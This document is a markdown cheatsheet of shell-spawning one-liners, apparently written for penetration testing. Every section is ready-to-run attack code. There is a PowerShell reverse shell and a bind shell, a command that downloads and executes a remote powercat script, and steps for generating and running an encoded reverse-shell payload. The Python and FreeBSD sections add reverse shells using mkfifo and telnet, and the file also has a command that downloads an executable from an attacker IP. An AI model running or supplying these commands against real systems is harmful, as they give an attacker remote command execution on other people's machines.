# Shell spawn cheatsheet



## *Powershell*

### Download file
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.22.33.44/wget.exe','C:\Users\test\Desktop\wget.exe')"
```

### Reverse shell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('11.22.33.44',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind shell
```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### Load a remote powercat script
```powershell
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/0xc0de44/0xc0de/master/tools/powercat.ps1')
```

### Generate encoded payload (here a reverse shell)
```powershell
powercat -c 11.22.33.44 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```
### Execute it
```powershell
powershell -E <encoded payload>
```

## *python*

### Reverse shell
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("11.22.33.44",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
### Proper shell oneliner
```python
  python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
/usr/bin/script -qc /bin/bash /dev/null
```
## *FreeBSD*
### Reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 172.18.0.2 8080 > /tmp/f
```


